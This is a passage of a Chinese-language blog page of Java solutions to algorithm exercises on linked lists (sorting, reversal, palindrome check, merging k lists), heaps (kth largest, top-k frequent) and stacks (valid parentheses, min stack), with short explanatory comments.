class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">sortList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-comment">//初始化变量</span><br>        ListNode h,h1,h2,res,pre;<br>        h = head;<br>        res = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        res.next = head;<br>        <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>,step = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(h != <span class="hljs-keyword">null</span>)&#123;<br>            length++;<br>            h = h.next;<br>        &#125;<br><br>        <span class="hljs-comment">//迭代合并</span><br>        <span class="hljs-keyword">while</span> (step &lt; length) &#123;<br>            pre = res;<br>            h = res.next;<br>            <span class="hljs-keyword">while</span>(h != <span class="hljs-keyword">null</span>)&#123;<br>                h1 = h;<br>                <span class="hljs-keyword">int</span> i = step;<br>                <span class="hljs-keyword">while</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; h != <span class="hljs-keyword">null</span>)&#123;<br>                    h = h.next;<br>                    i--;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-comment">//此时不足one step</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                h2 = h;<br>                i = step;<br>                <span class="hljs-keyword">while</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; h != <span class="hljs-keyword">null</span>)&#123;<br>                    h = h.next;<br>                    i--;<br>                &#125;<br>                <span class="hljs-comment">//合并两组中前一组长度step，后一组step-i</span><br>                <span class="hljs-keyword">int</span> len1 = step,len2 = step - i;<br>                <span class="hljs-comment">//开始合并,有序链表合并</span><br>                <span class="hljs-keyword">while</span>(len1 &gt; <span class="hljs-number">0</span> &amp;&amp; len2 &gt; <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(h1.val &lt;= h2.val)&#123;<br>                        len1--;<br>                        pre.next = h1;<br>                        h1 = h1.next;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        len2--;<br>                        pre.next = h2;<br>                        h2 = h2.next;<br>                    &#125;<br>                    pre = pre.next;<br>                &#125;<br>                pre.next = len1 == <span class="hljs-number">0</span> ? h2 : h1;<br>                <span class="hljs-keyword">while</span>(len1 &gt; <span class="hljs-number">0</span> || len2 &gt; <span class="hljs-number">0</span>)&#123;<br>                    pre = pre.next;<br>                    len1--;<br>                    len2--;<br>                &#125;<br>                <span class="hljs-comment">//把当前合并链表尾节点和下一个待合并链表头节点连接</span><br>                pre.next = h;<br>                <br>            &#125;    <br>            step *= <span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.next;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-7-相交链表"><a href="#2-7-相交链表" class="headerlink" title="2.7 相交链表"></a>2.7 相交链表</h2><p>剑指offer相遇解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode headA, ListNode headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(headA == headB)&#123;<br>            <span class="hljs-keyword">return</span> headA;<br>        &#125;<br>        ListNode node1 = headA;<br>        ListNode node2 = headB;<br>        <span class="hljs-keyword">boolean</span> flag1 = <span class="hljs-keyword">true</span>,flag2 = <span class="hljs-keyword">true</span>;<br>        <span class="hljs-keyword">while</span>(node1!=<span class="hljs-keyword">null</span> || node2 != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(node1 != <span class="hljs-keyword">null</span>)&#123;<br>                node1 = node1.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(flag1)&#123;<br>                    node1 = headB;<br>                    flag1 = <span class="hljs-keyword">false</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(node2 != <span class="hljs-keyword">null</span>)&#123;<br>                node2 = node2.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(flag2)&#123;<br>                    node2 = headA;    <br>                &#125;<br>                flag2 = <span class="hljs-keyword">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(node1 == node2)&#123;<br>                <span class="hljs-keyword">return</span> node1;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-8-反转链表"><a href="#2-8-反转链表" class="headerlink" title="2.8 反转链表"></a>2.8 反转链表</h2><p>迭代解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        ListNode node = head.next;<br>        ListNode tmp = <span class="hljs-keyword">null</span>;<br>        head.next = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>(node.next != <span class="hljs-keyword">null</span>)&#123;<br>            tmp = node.next;<br>            node.next = head;<br>            head = node;<br>            node = tmp;<br>        &#125;<br>        node.next = head;<br>        head = node;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>递归解法：</p><p>更简洁，但会有O(N)的空间复杂度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        ListNode last = reverseList(head.next);<br>        head.next.next = head;<br>        head.next = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">return</span> last;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-9-回文链表"><a href="#2-9-回文链表" class="headerlink" title="2.9 回文链表"></a>2.9 回文链表</h2><p>链表后序遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> ListNode left;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        left = head;<br>        <span class="hljs-keyword">return</span> traverse(head);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">traverse</span><span class="hljs-params">(ListNode right)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (right == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    <span class="hljs-keyword">boolean</span> res = traverse(right.next);<br>    <span class="hljs-comment">// 后序遍历代码,右边无res的话比较的是当前对称节点是否相同而无法记录前面的结果</span><br>    res = res &amp;&amp; (right.val == left.val);<br>    left = left.next;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种解法相当于链表反转和原链表比较，会占用O(N)的空间复杂度。</p><p>可以将前半段链表和反转后半段链表比较，这样不会占用格外的空间。关键是利用快慢指针找到链表中点。</p><p>优化空间复杂度：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.jpg" alt="3" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode fast = head,slow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast  = fast.next.next;<br>            slow = slow.next;<br>        &#125;<br>        <span class="hljs-comment">//fast == null 链表为奇数，slow为中点</span><br>        <span class="hljs-comment">//fast != null 链表偶数，slow再走一步</span><br>        <span class="hljs-keyword">if</span>(fast != <span class="hljs-keyword">null</span>)&#123;<br>            slow = slow.next;<br>        &#125;<br>        ListNode right = reverse(slow);<br>    <span class="hljs-comment">//一定要使用right，因为left和right不是完全相同，当链表节点个数为奇数，中点没有参与判断</span><br>        <span class="hljs-keyword">while</span>(right != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(right.val != head.val)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            right = right.next;<br>            head = head.next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br><span class="hljs-comment">//反转链表</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> ListNode <span class="hljs-title">reverse</span><span class="hljs-params">(ListNode head)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        ListNode tmp = <span class="hljs-keyword">null</span>;<br>        ListNode node = head.next;<br>        head.next = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>(node.next != <span class="hljs-keyword">null</span>)&#123;<br>            tmp = node.next;<br>            node.next = head;<br>            head = node;<br>            node = tmp;            <br>        &#125;<br>        node.next = head;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-10-合并k个升序链表"><a href="#2-10-合并k个升序链表" class="headerlink" title="2.10 合并k个升序链表"></a>2.10 合并k个升序链表</h2><p>两两合并，借助归并排序的递归分治思想</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeKLists</span><span class="hljs-params">(ListNode[] lists)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length = lists.length;<br>        <span class="hljs-keyword">if</span>(lists == <span class="hljs-keyword">null</span> || length == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> merge(lists,<span class="hljs-number">0</span>,length - <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> ListNode <span class="hljs-title">merge</span><span class="hljs-params">(ListNode[] lists, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (left == right) <span class="hljs-keyword">return</span> lists[left];<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        ListNode l1 = merge(lists, left, mid);<br>        ListNode l2 = merge(lists, mid + <span class="hljs-number">1</span>, right);<br>        <span class="hljs-keyword">return</span> mergeTwoLists(l1, l2);<br>    &#125;<br><br><span class="hljs-comment">//两个有序链表合并</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;<br>        <span class="hljs-comment">//合并链表头节点</span><br>        ListNode head = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">//特殊情况</span><br>        <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125;<br>        <span class="hljs-comment">//选出头节点</span><br>        <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val)&#123;<br>            head = l1;<br>            l1 = l1.next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            head = l2;<br>            l2 = l2.next;<br>        &#125;<br>        <span class="hljs-comment">//迭代比较合并</span><br>        ListNode l = head;<br>        <span class="hljs-keyword">while</span>(l1 != <span class="hljs-keyword">null</span> || l2 != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>)&#123;<br>                l.next = l2;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>)&#123;<br>                l.next = l1;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val)&#123;<br>                l.next = l1;<br>                l = l.next;<br>                l1 = l1.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                l.next = l2;<br>                l = l.next;<br>                l2 = l2.next;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br></code></pre></td></tr></table></figure><p>优先队列思想：</p><p>借助Java默认实现的PriorityQueue小根堆将所有结点都放在小根堆，每次取出的都是最小值。</p><p>不断地从小到大取出并连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeKLists</span><span class="hljs-params">(ListNode[] lists)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length = lists.length;<br>        <span class="hljs-keyword">if</span>(lists == <span class="hljs-keyword">null</span> || length == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        PriorityQueue&lt;ListNode&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(lists.length, <span class="hljs-keyword">new</span> Comparator&lt;ListNode&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(ListNode o1, ListNode o2)</span> </span>&#123;<br>                <span class="hljs-keyword">if</span> (o1.val &lt; o2.val) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o1.val == o2.val) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;);<br>        ListNode dummy = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        ListNode p = dummy;<br>        <span class="hljs-keyword">for</span> (ListNode node : lists) &#123;<br>            <span class="hljs-keyword">if</span> (node != <span class="hljs-keyword">null</span>) queue.add(node);<br>        &#125;<br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            p.next = queue.poll();<br>            p = p.next;<br>            <span class="hljs-keyword">if</span> (p.next != <span class="hljs-keyword">null</span>) queue.add(p.next);<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummy.next;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="3-堆"><a href="#3-堆" class="headerlink" title="3. 堆"></a>3. 堆</h1><h2 id="3-1-数组中的第K个最大元素"><a href="#3-1-数组中的第K个最大元素" class="headerlink" title="3.1 数组中的第K个最大元素"></a>3.1 数组中的第K个最大元素</h2><p>使用内置排序方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    Arrays.sort(nums);<br>    <span class="hljs-keyword">return</span> nums[nums.length - k];<br>&#125;<br></code></pre></td></tr></table></figure><p>使用堆：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    Queue&lt;Integer&gt; pq = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;((v1,v2)-&gt;(v2-v1));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        pq.add(num);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(k-- &gt; <span class="hljs-number">1</span>)&#123;<br>        pq.poll();<br>    &#125;<br>    <span class="hljs-keyword">return</span> pq.poll();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-2-前-K-个高频元素"><a href="#3-2-前-K-个高频元素" class="headerlink" title="3.2 前 K 个高频元素"></a>3.2 前 K 个高频元素</h2><p>值得注意的是遍历hashmap的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; set : map.entrySet())<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] topKFrequent(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;<br>    HashMap&lt;Integer, Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        map.put(num,map.getOrDefault(num,<span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    PriorityQueue&lt;<span class="hljs-keyword">int</span>[]&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;<span class="hljs-keyword">int</span>[]&gt;(<span class="hljs-keyword">new</span> Comparator&lt;<span class="hljs-keyword">int</span>[]&gt;() &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] m, <span class="hljs-keyword">int</span>[] n)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> m[<span class="hljs-number">1</span>] - n[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;);<br>    <span class="hljs-keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; set : map.entrySet())&#123;<br>        <span class="hljs-keyword">int</span> num = set.getKey(), count = set.getValue();<br>        <span class="hljs-keyword">if</span>(queue.size() &lt; k)&#123;<br>            queue.offer(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;num, count&#125;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(count &gt; queue.peek()[<span class="hljs-number">1</span>])&#123;<br>                queue.poll();<br>                queue.offer(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;num, count&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>          <span class="hljs-keyword">int</span>[] ret = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[k];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; k; ++i) &#123;<br>        ret[i] = queue.poll()[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-栈-队列"><a href="#4-栈-队列" class="headerlink" title="4. 栈/队列"></a>4. 栈/队列</h1><h2 id="4-1-有效的括号"><a href="#4-1-有效的括号" class="headerlink" title="4.1 有效的括号"></a>4.1 有效的括号</h2><p>注意java里面栈的结构是双端队列Deque</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValid</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = s.length();<br>    <span class="hljs-keyword">if</span>(n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br><br>    HashMap&lt;Character, Character&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    map.put(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>);<br>    map.put(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>);<br>    map.put(<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>); <br><br>    Deque&lt;Character&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">char</span> c = s.charAt(i);<br>        <span class="hljs-keyword">if</span>(map.containsKey(c))&#123;<br>            <span class="hljs-keyword">if</span>(stack.isEmpty() || map.get(c) != stack.peek())&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            stack.pop();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            stack.push(c);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> stack.isEmpty();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-最小栈"><a href="#4-2-最小栈" class="headerlink" title="4.2 最小栈"></a>4.2 最小栈</h2><p>同剑指offer包含min函数的最小栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MinStack</span> </span>&#123;<br><br>    <span class="hljs-comment">/** initialize your data structure here. */</span><br>    Stack&lt;Integer&gt; stack1,stack2;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MinStack</span><span class="hljs-params">()</span> </span>&#123;<br>        stack1 = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        stack2 = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>        stack1.add(x);<br>        <span class="hljs-keyword">if</span>(stack2.empty() || stack2.peek() &gt;= x)&#123;<br>            stack2.add(x);<br>        &#125;<br>    &#125;<br>  